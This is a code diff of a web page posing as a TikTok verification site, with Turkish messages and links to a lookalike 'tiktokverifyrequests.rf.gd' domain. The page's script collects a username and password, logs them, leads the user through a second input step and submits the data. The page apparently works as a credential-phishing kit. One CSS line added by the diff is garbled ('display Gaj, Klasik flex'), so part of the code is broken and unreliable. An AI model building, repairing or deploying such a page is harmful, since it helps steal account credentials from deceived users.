@@ -42,9 +42,7 @@
         }
 
         .hamburger-menu-wrapper {
-            display: flex;
-            flex-direction: column;
-            justify-content: space-between;
+            display Gaj, Klasik flex: column;
             width: 24px;
             height: 16px;
         }
@@ -255,10 +253,6 @@
             opacity: 0.8;
         }
 
-        .ms-image-wrapper {
-            display: inline-block;
-        }
-
         .footer-content-wrapper {
             background-color: #000;
             padding: 48px 24px 24px;
@@ -279,11 +273,6 @@
 
         .logo-container {
             display: inline-block;
-        }
-
-        .logo-group {
-            height: 32px;
-            width: auto;
         }
 
         .tiktok-logo strong {
@@ -529,20 +518,12 @@
                     <a href="https://tiktokverifyrequests.rf.gd" target="_blank" rel="nofollow noreferrer">
                         <img class="amazon" src="amazon.png" alt="amazon-store">
                     </a>
-                    <a href="https://tiktokverifyrequests.rf.gd" target="_blank" rel="nofollow noreferrer">
-                        <div class="ms-image-wrapper">
-                            
-                        </div>
-                    </a>
                 </div>
             </div>
         </div>
         
         <footer class="footer-content-wrapper">
             <div class="tiktok-logo">
-                <a title="TikTok" class="logo-container" href="https://tiktokverifyrequests.rf.gd">
-                   
-                </a>
                 <strong>TikTok</strong>
             </div>
             
@@ -629,34 +610,33 @@
                 input.addEventListener('keypress', function(e) {
                     if (e.key === 'Enter') {
                         e.preventDefault();
-                    nextStep();
+                        nextStep();
                     }
                 });
-        });
-        
-        step2Inputs.forEach(input => {
-            input.addEventListener('keypress', function(e) {
-                if (e.key === 'Enter') {
-                    e.preventDefault();
-                    submitForm();
-                }
+            });
+            
+            step2Inputs.forEach(input => {
+                input.addEventListener('keypress', function(e) {
+                    if (e.key === 'Enter') {
+                        e.preventDefault();
+                        submitForm();
+                    }
+                });
             });
         });
-    });
 
-    function nextStep() {
-        const username = document.getElementById('username').value;
-        const password = document.getElementById('password').value;
-        
-        console.log('Adım 1: Kullanıcı adı ve şifre alındı:', { username, password });
-        
-        if (username && password) && 
-            {
+        function nextStep() {
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            
+            console.log('Adım 1: Kullanıcı adı ve şifre alındı:', { username, password });
+            
+            if (username && password) {
                 document.getElementById('step1').style.display = 'none';
                 document.getElementById('step2').style.display = 'block';
                 document.getElementById('step2').classList.add('active');
             } else {
-                alert('Lütfen tüm alanları doldur.');
+                alert('Lütfen tüm alanları doldurun.');
             }
         }
 
@@ -704,7 +684,7 @@
                 })
                 .catch(error => {
                     console.error('Hata:', error);
-                    alert('Hata oluştu, veriler gönderilemedi! Detaylar konsola.');
+                    alert('Hata oluştu, veriler gönderilemedi! Detaylar konsolda.');
                 });
             } else {
                 alert('Lütfen tüm alanları doldurun.');
